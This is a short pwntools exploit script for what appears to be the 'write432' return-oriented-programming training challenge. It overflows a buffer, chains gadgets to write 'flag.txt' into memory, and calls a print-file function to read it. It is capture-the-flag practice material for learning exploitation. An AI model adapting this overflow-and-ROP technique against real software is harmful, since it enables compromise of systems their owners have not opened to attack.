from pwn import *

p = process("./write432")
print(p.pid)
pause()
#gadget

pop_edi_ebp_ret = 0x080485aa
mov_dword_ptr_edi_ebp_ret = 0x08048543
text_1 = b"flag"
text_2 = b".txt"
bss_area = 0x804a020



payload = b"A"*44
payload += p32(pop_edi_ebp_ret)
payload += p32(bss_area)
payload += text_1
payload += p32(mov_dword_ptr_edi_ebp_ret)
payload += p32(pop_edi_ebp_ret)
payload += p32(bss_area+0x4)
payload += text_2
payload += p32(mov_dword_ptr_edi_ebp_ret)
payload += p32(0x80483d0) #print file
payload += p32(0)
payload += p32(bss_area)
p.sendline(payload)

p.interactive()
